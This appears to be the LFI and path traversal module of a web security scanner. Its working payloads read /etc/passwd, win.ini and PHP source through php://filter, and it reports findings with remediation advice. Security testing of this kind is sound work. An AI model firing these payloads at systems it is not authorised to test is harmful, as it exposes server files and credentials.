"""
LFIModule — YATA RECON module.
Detects Local File Inclusion and Path Traversal vulnerabilities.
"""
import threading
import urllib.parse
import re
from concurrent.futures import ThreadPoolExecutor, as_completed

try:
    import requests
except ImportError:
    requests = None

from recon.modules import BaseModule


def _qjoin(endpoint: str, query_suffix: str) -> str:
    """Append a raw query suffix to an endpoint that may already have its
    own query string (recon.py seeds endpoints like /index.php?id=1 —
    blindly appending '?param=value' would double up the '?' and the
    payload would never reach the target parameter)."""
    sep = "&" if "?" in endpoint else "?"
    return f"{endpoint}{sep}{query_suffix}"


class LFIModule(BaseModule):
    NAME = "LFI / Path Traversal"

    LFI_PARAMS = [
        "file", "path", "page", "include", "doc", "folder", "template", 
        "view", "content", "cat", "dir", "action", "board", "date", 
        "detail", "download", "prefix", "inc", "locate", "show", "site", 
        "type", "val", "name"
    ]

    # Ordered so the two most universal probes — one Linux, one Windows — come
    # FIRST. The liveness short-circuit (see _test_point) only fires after both
    # OS probes have been tried, so a Windows-only LFI is never skipped just
    # because /etc/passwd didn't resolve.
    PAYLOADS = [
        "../../../../../../../../../../etc/passwd",          # Linux
        "..\\..\\..\\..\\..\\..\\..\\..\\windows\\win.ini",  # Windows
        "/etc/passwd",
        "C:\\Windows\\win.ini",
        "..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd",
        "....//....//....//....//....//etc/passwd",
    ]
    # Index after which it is safe to declare a param inert (both OS probes
    # above have been sent).
    _LIVENESS_GATE_INDEX = 1

    SIGNATURES = [
        (r"root:x:0:0:", "Linux /etc/passwd"),
        (r"bin:x:1:1:", "Linux /etc/passwd"),
        (r"daemon:x:", "Linux /etc/passwd"),
        (r"\[extensions\]", "Windows win.ini"),
        (r"\[fonts\]", "Windows win.ini"),
        (r"; for 16-bit app support", "Windows win.ini")
    ]

    # PHP stream-wrapper source-disclosure — a completely different
    # technique from path traversal: no filesystem path leaves the
    # application at all (so "does the value contain ../" style filters
    # never even see anything to block), yet it reads the CURRENT
    # application's own PHP source through the include/require sink,
    # commonly revealing DB credentials and internal logic even when
    # traversal to /etc/passwd is blocked outright.
    PHP_FILTER_PAYLOADS = [
        "php://filter/convert.base64-encode/resource=index",
        "php://filter/convert.base64-encode/resource=config",
        "php://filter/convert.base64-encode/resource=../config",
    ]

    # Cap how many endpoints the *guessed* param name-list is sprayed across.
    # Real LFI params almost always already appear in a crawled URL's query
    # string (so they're covered as real params regardless of this cap); the
    # guess-list is only a fallback for params nothing surfaced. Spraying 24
    # guessed names across every one of 30+ endpoints is what turned this
    # module into a ~7000-request, 90-minute serial crawl.
    MAX_GUESS_ENDPOINTS = 12

    def run(self):
        self.ui.section("LFI — Local File Inclusion / Path Traversal Detection")
        if not requests:
            return
        try:
            import urllib3; urllib3.disable_warnings()
        except Exception:
            pass

        s = self._session()
        self._found_lock = threading.Lock()
        self._found = 0

        test_points = self._collect_test_points()
        self.ui.info(
            f"Testing {len(test_points)} injection point(s) for LFI/Path Traversal "
            f"(liveness-filtered, {self.threads} workers)"
        )

        # Concurrency: with the shared adaptive throttle pacing request STARTS,
        # running points in parallel overlaps each request's network wait with
        # the next one's pacing delay instead of paying (delay + latency)
        # serially per request — the other half of the speedup, on top of the
        # liveness pre-filter that stops dead params from ever reaching the
        # payload loop.
        with ThreadPoolExecutor(max_workers=max(1, self.threads)) as ex:
            futures = [ex.submit(self._test_point, s, ep, param) for ep, param in test_points]
            for fut in as_completed(futures):
                try:
                    fut.result()
                except Exception as e:
                    if self.verbose:
                        self.ui.error(f"LFI thread error: {e}")

        # API endpoints from an OpenAPI/Swagger spec (recon.py) — a JSON REST
        # API has no query-string surface for the loop above to find at all,
        # but a path segment like /files/{name} or a JSON body prop like
        # "filename" is exactly as exploitable.
        self._found += self._test_api_endpoints(s)

        if self._found == 0:
            self.ui.info("No LFI/Path Traversal vulnerabilities detected.")

    def _collect_test_points(self):
        """Build a deduplicated (endpoint, param) worklist, prioritising REAL
        params (those actually present in a crawled URL's query string, plus
        params discovered by params.py) and spraying the guessed name-list
        across only a capped number of endpoints."""
        endpoints = [self.base_url] + self.ctx.get("endpoints", [])[:30]
        seen = set()
        points = []

        def add(ep, param):
            # Normalise the endpoint to its path (drop its own query string)
            # so the same (path, param) isn't tested twice via two seed URLs.
            base = ep.split("#", 1)[0]
            key = (base.split("?", 1)[0], param)
            if key in seen:
                return
            seen.add(key)
            points.append((ep, param))

        # 1. Real params already visible in each endpoint's query string.
        guess_budget = []
        for ep in endpoints:
            try:
                q = urllib.parse.urlparse(ep).query
            except Exception:
                q = ""
            if q:
                for param in urllib.parse.parse_qs(q, keep_blank_values=True):
                    add(ep, param)
            else:
                guess_budget.append(ep)

        # 2. Params discovered by params.py — (endpoint, name) tuples or dicts.
        for entry in self.ctx.get("discovered_params", []):
            if isinstance(entry, (tuple, list)) and len(entry) == 2:
                add(entry[0], entry[1])
            elif isinstance(entry, dict):
                dep = entry.get("endpoint") or entry.get("url") or self.base_url
                for param in entry.get("params", {}).keys():
                    add(dep, param)

        # 3. Guessed file-ish param names — only on endpoints that carried no
        #    query string of their own, capped to keep the matrix bounded.
        for ep in guess_budget[: self.MAX_GUESS_ENDPOINTS]:
            for param in self.LFI_PARAMS:
                add(ep, param)

        return points

    def _test_point(self, s, endpoint, param):
        """Baseline → traversal payloads (with an early liveness short-circuit)
        → php://filter, for a single (endpoint, param).

        The speed-up without sacrificing recall: the FIRST payload is the most
        universal traversal (`../…/etc/passwd`). After it, if the response is
        structurally identical to the benign baseline AND the value isn't
        reflected, the parameter plainly has no effect on output — it cannot be
        a content-returning file sink, so we skip the remaining payloads and
        the php://filter probes. A real sink instead either leaks on that first
        payload (reported immediately) or renders a *different* page (a
        file-not-found/error), which keeps it in the full payload loop. This is
        correct where a two-benign-value gate is NOT: an include() sink returns
        the same default page for any two nonexistent benign names, so comparing
        benign-vs-benign would wrongly skip a real vulnerability."""
        benign = "yata_recon_baseline_7f1a"
        baseline_text = self._req_text(s, _qjoin(endpoint, f"{param}={benign}"))
        if baseline_text is None:
            return

        found_here = False
        inert = False
        benign_reflected = benign in baseline_text
        live_signal = benign_reflected   # param already proven to reach output?
        for i, payload in enumerate(self.PAYLOADS):
            url = _qjoin(endpoint, f"{param}={urllib.parse.quote(payload)}")
            self._throttle()
            try:
                resp = s.get(url, timeout=self.timeout)
            except Exception:
                continue
            body = resp.text

            for sig_pattern, sig_desc in self.SIGNATURES:
                if re.search(sig_pattern, body, re.IGNORECASE):
                    # Verify signature does not exist in baseline (page may
                    # naturally contain e.g. "[fonts]").
                    if re.search(sig_pattern, baseline_text, re.IGNORECASE):
                        continue
                    self._report_traversal(endpoint, param, payload, sig_desc)
                    found_here = True
                    break  # one signature is enough per payload
            if found_here:
                break

            # Does this payload show the param influences output at all?
            if (payload in body) or (not self._responses_equivalent(baseline_text, body)):
                live_signal = True

            # Early liveness short-circuit: once BOTH OS probes (Linux + Windows,
            # the first two payloads) have been tried and NOTHING indicates the
            # param reaches output — no leak, no reflection, no change vs. the
            # benign baseline — it can't be a content-returning file sink. Skip
            # the remaining payloads and the php://filter probes.
            if i >= self._LIVENESS_GATE_INDEX and not live_signal:
                inert = True
                if self.verbose:
                    self.ui.info(f"  Inert param (no effect on output): {endpoint} param={param}")
                break

        # php://filter source-code disclosure — a DIFFERENT technique from
        # path traversal (no filesystem path at all, so traversal-sequence
        # filters/WAF rules don't apply), only tried once traversal found
        # nothing for a param that actually influences output. Skipped for
        # params the liveness short-circuit proved inert.
        if not found_here and not inert and self._test_php_filter(s, endpoint, param, baseline_text):
            with self._found_lock:
                self._found += 1

    def _req_text(self, s, url):
        self._throttle()
        try:
            return s.get(url, timeout=self.timeout).text
        except Exception:
            return None

    def _responses_equivalent(self, a, b):
        """True when two responses are the 'same page' for liveness purposes:
        identical normalised structure and near-identical length. Uses the
        structural hash (tag-sequence / JSON-shape) so trivial per-request
        text jitter doesn't defeat the gate, while a genuinely different
        rendering (which is what a file-read sink produces) does."""
        if a is None or b is None:
            return False
        try:
            if self.validator._structural_hash(a) != self.validator._structural_hash(b):
                return False
        except Exception:
            pass
        longer = max(len(a), len(b)) or 1
        return abs(len(a) - len(b)) <= max(24, longer * 0.02)

    def _report_traversal(self, endpoint, param, payload, sig_desc):
        added = self.db.add(
            title=f"LFI / Path Traversal via '{param}'",
            severity="critical", url=endpoint, module=self.NAME,
            description=(
                f"Parameter '{param}' is vulnerable to Path Traversal/LFI. "
                f"Payload '{payload}' resulted in the disclosure of {sig_desc}. "
                "This allows an attacker to read arbitrary files on the server."
            ),
            remediation=(
                "Do not pass user input directly to filesystem APIs. "
                "Validate input against a strict whitelist of permitted files. "
                "Use secure APIs like os.path.realpath() to ensure the resolved "
                "path is within the expected directory."
            ),
            cvss="7.5",
            confidence="CONFIRMED",
            confidence_score=95,
            validation_steps=["file_content_matched", "baseline_compared", "param_liveness_confirmed"],
            evidence=[f"Payload: {payload}", f"Matched Signature: {sig_desc}"],
        )
        if added:
            with self._found_lock:
                self._found += 1
            self.ui.find("critical", f"LFI via '{param}' ({sig_desc})", endpoint)

    def _test_api_endpoints(self, s) -> int:
        found = 0
        auth_headers = self.ctx.get("auth_headers", {})

        for api_ep in self.ctx.get("api_endpoints", []):
            method = api_ep.get("method", "GET")
            headers = dict(auth_headers)
            for name, example in api_ep.get("header_params", []):
                if example:
                    headers[name] = str(example)

            # Path-segment params that look like they might reference a file
            path_params = api_ep.get("path_params", [])
            for pname, _ in path_params:
                if not any(hint in pname.lower() for hint in
                           ("file", "path", "name", "doc", "page", "id", "flag")):
                    continue

                def build_url(value):
                    u = api_ep["url"]
                    for other_pname, other_example in path_params:
                        default = str(other_example) if other_example else "1"
                        placeholder = "{" + other_pname + "}"
                        chosen = value if other_pname == pname else default
                        u = u.replace(placeholder, urllib.parse.quote(chosen, safe=""))
                    return u

                self._throttle()
                try:
                    base_resp = s.request(method, build_url("yata_recon_baseline_test"),
                                           timeout=self.timeout, headers=headers)
                    base_text = base_resp.text
                except Exception:
                    base_text = ""

                for payload in self.PAYLOADS:
                    self._throttle()
                    try:
                        resp = s.request(method, build_url(payload), timeout=self.timeout, headers=headers)
                    except Exception:
                        continue
                    if self._check_signatures(resp.text, base_text, api_ep["url"], pname, payload, path=True):
                        found += 1
                if found > 5:
                    return found

            # JSON body properties that look file-related
            json_props = api_ep.get("json_props", [])
            file_props = [p for p in json_props if any(
                hint in p.lower() for hint in ("file", "path", "name", "doc", "template"))]
            for prop in file_props:
                other = {p: "test" for p in json_props if p != prop}
                self._throttle()
                try:
                    baseline_resp = s.request(method, api_ep["url"], timeout=self.timeout,
                                               headers=headers, json={**other, prop: "yata_recon_baseline_test"})
                    base_text = baseline_resp.text
                except Exception:
                    base_text = ""
                for payload in self.PAYLOADS:
                    self._throttle()
                    try:
                        resp = s.request(method, api_ep["url"], timeout=self.timeout,
                                          headers=headers, json={**other, prop: payload})
                    except Exception:
                        continue
                    if self._check_signatures(resp.text, base_text, api_ep["url"], prop, payload, path=False):
                        found += 1
                if found > 5:
                    return found

        return found

    def _check_signatures(self, body, baseline_text, url, param, payload, path: bool) -> bool:
        for sig_pattern, sig_desc in self.SIGNATURES:
            if re.search(sig_pattern, body, re.IGNORECASE):
                if baseline_text and re.search(sig_pattern, baseline_text, re.IGNORECASE):
                    continue
                loc = "URL path segment" if path else "JSON body property"
                self.db.add(
                    title=f"LFI / Path Traversal via '{param}' ({loc})",
                    severity="critical", url=url, module=self.NAME,
                    description=(
                        f"The '{param}' {loc} is vulnerable to Path Traversal/LFI. "
                        f"Payload '{payload}' resulted in the disclosure of {sig_desc}. "
                        "This allows an attacker to read arbitrary files on the server."
                    ),
                    remediation=(
                        "Do not pass user input directly to filesystem APIs. "
                        "Validate input against a strict whitelist of permitted files. "
                        "Use secure APIs like os.path.realpath() to ensure the resolved "
                        "path is within the expected directory."
                    ),
                    cvss="7.5",
                    confidence="CONFIRMED",
                    confidence_score=95,
                    validation_steps=["file_content_matched", "baseline_compared"],
                    evidence=[f"Payload: {payload}", f"Matched Signature: {sig_desc}"],
                )
                self.ui.find("critical", f"LFI via '{param}' ({sig_desc})", url)
                return True
        return False

    def _check_php_filter_response(self, body):
        """Return a decoded snippet if `body` looks like base64-encoded PHP
        source (the php://filter/convert.base64-encode response shape),
        else None. Base64 is a tight enough character set that a normal
        HTML/JSON error page essentially never matches this by coincidence."""
        stripped = (body or "").strip()
        if not (20 <= len(stripped) <= 200000):
            return None
        if not re.match(r'^[A-Za-z0-9+/=\s]+$', stripped):
            return None
        try:
            import base64
            padded = stripped + "=" * (-len(stripped) % 4)
            decoded = base64.b64decode(padded, validate=False)
            text = decoded.decode('utf-8', errors='ignore')
        except Exception:
            return None
        if any(marker in text for marker in ("<?php", "<?=", "define(", "DB_PASSWORD", "<%")):
            return text
        return None

    def _test_php_filter(self, s, endpoint, param, baseline_text) -> bool:
        baseline_decoded = self._check_php_filter_response(baseline_text)
        for payload in self.PHP_FILTER_PAYLOADS:
            url = _qjoin(endpoint, f"{param}={urllib.parse.quote(payload)}")
            self._throttle()
            try:
                resp = s.get(url, timeout=self.timeout)
            except Exception:
                continue

            decoded = self._check_php_filter_response(resp.text)
            if not decoded or decoded == baseline_decoded:
                continue

            self.db.add(
                title=f"LFI — Source Code Disclosure via php://filter Wrapper ('{param}')",
                severity="critical", url=endpoint, module=self.NAME,
                description=(
                    f"Parameter '{param}' passes through to a PHP include/require sink without "
                    "restricting the URL scheme. The php://filter wrapper with "
                    "convert.base64-encode was used to dump this file's own PHP SOURCE CODE "
                    "(not just traverse to /etc/passwd) — this bypasses any filter that only "
                    "checks for path-traversal sequences ('../'), since php://filter never "
                    f"touches a filesystem path at all. Decoded snippet: {decoded[:200]}"
                ),
                remediation=(
                    "Never pass user input to include()/require()/file_get_contents(). If "
                    "dynamic includes are unavoidable, use a strict allow-list of filenames and "
                    "explicitly reject any input containing '://' — this blocks every PHP "
                    "stream wrapper (php://, data://, expect://, zip://, phar://), not just this one."
                ),
                cvss="9.1", confidence="CONFIRMED", confidence_score=95,
                validation_steps=["php_filter_wrapper_accepted", "base64_decoded_to_php_source", "baseline_compared"],
                evidence=[f"Payload: {payload}", f"Decoded (first 300 chars): {decoded[:300]}"],
            )
            self.ui.find("critical", f"LFI — Source disclosure via php://filter ('{param}')", endpoint)
            return True
        return False
